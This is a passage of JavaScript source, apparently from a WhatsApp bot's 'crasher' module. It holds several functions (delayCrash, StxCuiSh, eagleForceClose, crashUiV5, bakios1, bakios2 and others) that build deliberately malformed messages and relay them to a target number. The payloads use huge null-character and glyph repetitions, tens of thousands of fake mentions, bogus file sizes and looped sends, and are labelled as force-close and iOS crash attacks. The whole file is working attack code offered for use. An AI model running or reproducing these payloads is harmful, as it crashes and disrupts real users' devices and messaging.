"midQualityFileSha256": "erjot3g+S1YfsbYqct30GbjvXD2wgQmog8blam1fWnA=", 
contextInfo: {
virtexId: FadelSM.generateMessageTag(),
participant: "0@s.whatsapp.net",
mentionedJid: [target, "0@s.whatsapp.net"],
quotedMessage: {
buttonsMessage: {
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
fileLength: "9999999999999",
pageCount: 3567587327,
mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
fileName: "〘⋉ 𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹! ⋊〙",
fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
mediaKeyTimestamp: "1735456100",
caption: "〘⋉ 𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹! ⋊〙"
},
hasMediaAttachment: true,
contentText: "〘⋉ 𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹! ⋊〙",
footerText: "Why?",
buttons: buttons, 
viewOnce: true,
headerType: 3
}
}, 
isForwarded: true,
actionLink: {
url: "t.me/joomodz",
buttonTitle: "〘⋉ 𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹! ⋊〙"
},
forwardedNewsletterMessageInfo: {
newsletterJid: "120363409362506610@newsletter",
serverMessageId: 1,
newsletterName: `〘⋉ 𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹! ⋊〙${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
contentType: 3,
accessibilityText: "kontol"
}
}
}
}
}
};
await FadelSM.relayMessage(target, messagePayload, {
messageId: FadelSM.generateMessageTag(), 
participant: { jid : target }
});
}
async function FHorseXFlowButton(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 1,
          },
          interactiveMessage: {
            contextInfo: {
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              participant: target,
              isForwarded: true,
              forwardingScore: 999,
              forwardedNewsletterMessageInfo: {
                newsletterJid: `33333333333333333@newsletter`,
                newsletterName: "〘⋉ 𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹! ⋊〙",
                businessOwnerJid: target,
              },
            },
            body: {
              text: "〘⋉ 𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹! ⋊〙",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "galaxy_message",
                  paramsJson: {
                    screen_2_OptIn_0: true,
                    screen_2_OptIn_1: true,
                    screen_1_Dropdown_0: "nullOnTop",
                    screen_1_DatePicker_1: "1028995200000",
                    screen_1_TextInput_2: "null@gmail.com",
                    screen_1_TextInput_3: "94643116",
                    screen_0_TextInput_0: "\u0000".repeat(500000),
                    screen_0_TextInput_1: "SecretDocu",
                    screen_0_Dropdown_2: "#926-Xnull",
                    screen_0_RadioButtonsGroup_3: "0_true",
                    flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                  },
                },
              ],
            },
          },
        },
      },
    };

    await FadelSM.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.log(err);
  }
}

async function FlowX(target, Amount) {
  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "",
              hasMediaAttachment: false,
            },
            body: {
              text: "〘⋉ 𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹! ⋊〙\n" + "ꦾ".repeat(Amount),
            },
            nativeFlowMessage: {
              messageParamsJson: "〘⋉ 𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹! ⋊〙",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: apiClient + "\u0000",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: apiClient + "〘⋉ 𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹! ⋊〙",
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await FadelSM.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
}

async function delayCrash(target, mention = false, delayMs = 500) {
    for (const targett of target) {
        const generateMessage = {
            viewOnceMessage: {
                message: {
                    imageMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                        mimetype: "image/jpeg",
                        caption: "? ???????-?",
                        fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                        fileLength: "19769",
                        height: 354,
                        width: 783,
                        mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                        fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                        directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                        mediaKeyTimestamp: "1743225419",
                        jpegThumbnail: null,
                        scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                        scanLengths: [2437, 17332],
                        contextInfo: {
                            mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                            isSampled: true,
                            participant: target,
                            remoteJid: "status@broadcast",
                            forwardingScore: 9741,
                            isForwarded: true
                        }
                    }
                }
            }
        };

        const msg = generateWAMessageFromContent(target, generateMessage, {});
        
        await FadelSM.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: undefined
                                }
                            ]
                        }
                    ]
                }
            ]
        });

        if (mention) {
            await FadelSM.relayMessage(
                target,
                {
                    statusMentionMessage: {
                        message: {
                            protocolMessage: {
                                key: msg.key,
                                type: 25
                            }
                        }
                    }
                },
                {
                    additionalNodes: [
                        {
                            tag: "meta",
                            attrs: { is_status_mention: "???? ???????? - ????" },
                            content: undefined
                        }
                    ]
                }
            );
        }

        // Delay antar target
        await new Promise(res => setTimeout(res, delayMs));
    }
}
async function StxCuiSh(target) {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
              contextInfo: {
              stanzaId: FadelSM.generateMessageTag(),
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 3567587327,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: "𓊈〘⋉ 𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹! ⋊〙𓊉",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: "𓊈〘⋉ 𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹! ⋊〙𓊉"
                    },
                },
              },
            body: {
              text: "𓊈〘⋉ 𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹! ⋊〙𓊉" + "ꦾ".repeat(10000)
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "cta_url",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "cta_call",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "cta_reminder",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "cta_cancel_reminder",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "address_message",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "send_location",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
              ],
            },
          },
        },
      },
    };
    await FadelSM.relayMessage(target, message, {
      participant: { jid: target },
    });
  }
  
async function eagleForceClose(target) {
for (let r = 0; r < 666; r++) {  
  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "X",
            mentionedJid: [target],
            forwardedNewsletterMessageInfo: {
              newsletterName: "Psycho ↯ Crasher | I'm Beginner",
              newsletterJid: "120363321780343299@newsletter",
              serverMessageId: 1
            },
            externalAdReply: {
              showAdAttribution: true,
              title: "€ Psycho ↯ Crasher",
              body: "",
              thumbnailUrl: null,
              sourceUrl: "https://tama.app/",
              mediaType: 1,
              renderLargerThumbnail: true
            },
            businessMessageForwardInfo: {
              businessOwnerJid: target,
            },
            dataSharingContext: {
              showMmDisclosure: true,
            },
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: null
              }
            }
          },
            header: {
              title: "",
              hasMediaAttachment: false
            },
            body: {
              text: "Psycho ↯ Crasher Kill You 👻☠️🦋🥷",
            },
            nativeFlowMessage: {
              messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"galaxy_message\",\"header\":\"Ryuichi - Beginner\",\"body\":\"Call Galaxy\"}",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: apiClient + "Psycho ↯ Crasher",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: apiClient + "Psycho ↯ Crasher",
                }, 
                {
                  name: "payment_method",
                  buttonParamsJson: ""
                },
                {
                  name: "payment_status",
                  buttonParamsJson: ""
                },
                {
                  name: "review_order",
                  buttonParamsJson: ""
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await FadelSM.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
console.log("success send force close whatsapp api")
}
}
async function systemUi2(target, Ptcp = false) {
    FadelSM.relayMessage(target, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "ꦾ".repeat(250000) + "@0".repeat(100000)
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "Psycho ↯ Crasher Kill You 👻☠️🦋🥷",
                        buttons: [
                            {
                                name: "quick_reply",
                                buttonParamsJson: "{\"display_text\":\"Psycho ↯ Crasher Kill You 👻☠️🦋🥷\",\"id\":\".groupchat\"}"
                            },
                            {
                                name: "single_select",
                                buttonParamsJson: {
                                    title: "Psycho ↯ Crasher Kill You 👻☠️🦋🥷",
                                    sections: [
                                        {
                                            title: "Psycho ↯ Crasher Kill You 👻☠️🦋🥷",
                                            rows: []
                                        }
                                    ]
                                }
                            }
                        ]
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "Psycho ↯ Crasher Kill You 👻☠️🦋🥷" }]
                    }
                }
            }
        }
    }, { participant: { jid: target }, messageId: null });
}

async function crashUiV5(target, Ptcp = false) {
    FadelSM.relayMessage(target, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "Psycho ↯ Crasher Kill You 👻☠️🦋🥷" + "@0".repeat(250000) + "ꦾ".repeat(100000)
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "call_permission_request",
                                buttonParamsJson: {}
                            }
                        ]
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [
                            {
                                groupJid: "0@s.whatsapp.net",
                                groupSubject: "Psycho ↯ Crasher Kill You 👻☠️🦋🥷"
                            }
                        ]
                    }
                }
            }
        }
    }, { participant: { jid: target }, messageId: null });
};

////////////////// FUNC BUG IOS ////////////////////////

async function bakios1(target) {
      try {
        await FadelSM.relayMessage(
          target,
          {
            extendedTextMessage: {
              text: "\n\n\n\n\n\n\u0000" + "ꦾ".repeat(47777),
              contextInfo: {
                stanzaId: "1234567890ABCDEF",
                participant: target,
                quotedMessage: {
                  callLogMesssage: {
                    isVideo: true,
                    callOutcome: "1",
                    durationSecs: "0",
                    callType: "REGULAR",
                    participants: [
                      {
                        jid: target,
                        callOutcome: "1",
                      },
                    ],
                  },
                },
                remoteJid: target,
                conversionSource: "source_example",
                conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
                conversionDelaySeconds: 10,
                forwardingScore: 9999999,
                isForwarded: true,
                quotedAd: {
                  advertiserName: "Example Advertiser",
                  mediaType: "IMAGE",
                  jpegThumbnail:
                    "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                  caption: "ꦽꦾ".repeat(10000),
                },
                placeholderKey: {
                  remoteJid: target,
                  fromMe: false,
                  id: "ABCDEF1234567890",
                },
                expiration: 86400,
                ephemeralSettingTimestamp: "1728090592378",
                ephemeralSharedSecret:
                  "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
                externalAdReply: {
                  title: "ꦽꦾ".repeat(77),
                  body: "🦠".repeat(44),
                  mediaType: "VIDEO",
                  renderLargerThumbnail: true,
                  previewTtpe: "VIDEO",
                  thumbnail:
                    "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                  sourceType: " x ",
                  sourceId: " x ",
                  sourceUrl: "https://𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵.com/",
                  mediaUrl: "https://𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵.com/",
                  containsAutoReply: true,
                  showAdAttribution: true,
                  ctwaClid: "ctwa_clid_example",
                  ref: "ref_example",
                },
                entryPointConversionSource: "entry_point_source_example",
                entryPointConversionApp: "entry_point_app_example",
                entryPointConversionDelaySeconds: 5,
                disappearingMode: {},
                actionLink: {
                  url: "https://𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵.com/",
                },
                groupSubject: "Example Group Subject",
                parentGroupJid: "6287888888888-1234567890@g.us",
                trustBannerType: "trust_banner_example",
                trustBannerAction: 1,
                isSampled: false,
                utm: {
                  utmSource: "utm_source_example",
                  utmCampaign: "utm_campaign_example",
                },
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "6287888888888-1234567890@g.us",
                  serverMessageId: 1,
                  newsletterName: " X ",
                  contentType: "UPDATE",
                  accessibilityText: " X ",
                },
                businessMessageForwardInfo: {
                  businessOwnerJid: "0@s.whatsapp.net",
                },
                smbClientCampaignId: "smb_client_campaign_id_example",
                smbServerCampaignId: "smb_server_campaign_id_example",
                dataSharingContext: {
                  showMmDisclosure: true,
                },
              },
            },
          },
          {
            participant: { jid: target },
            userJid: target,
          }
        );
      } catch (err) {
        console.log(err);
      }
    }
       
async function bakios2(target, Ptcp = false) {
			await FadelSM.relayMessage(target, {
					"extendedTextMessage": {
						"text": " 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲".repeat(20000),
						"contextInfo": {
							"stanzaId": "1234567890ABCDEF",
							"participant": "0@s.whatsapp.net",
							"quotedMessage": {
								"callLogMesssage": {
									"isVideo": true,
									"callOutcome": "1",
									"durationSecs": "0",
									"callType": "REGULAR",
									"participants": [{
										"jid": "0@s.whatsapp.net",
										"callOutcome": "1"
									}]
								}
							},
							"remoteJid": target,
							"conversionSource": "source_example",
							"conversionData": "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
							"conversionDelaySeconds": 10,
							"forwardingScore": 9999999,
							"isForwarded": true,
							"quotedAd": {
								"advertiserName": "Example Advertiser",
								"mediaType": "IMAGE",
								"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"caption": "This is an ad caption"
							},
							"placeholderKey": {
								"remoteJid": "6283139073473@s.whatsapp.net",
								"fromMe": false,
								"id": "ABCDEF1234567890"
							},
							"expiration": 86400,
							"ephemeralSettingTimestamp": "1728090592378",
							"ephemeralSharedSecret": "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
							"externalAdReply": {
								"title": "💣🦠".repeat(100),
								"body": "𑇂𑆵𑆴𑆿".repeat(100),
								"mediaType": "VIDEO",
								"renderLargerThumbnail": true,
								"previewTtpe": "VIDEO",
								"thumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"sourceType": " x ",
								"sourceId": " x ",
								"sourceUrl": "https://ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ.com/",
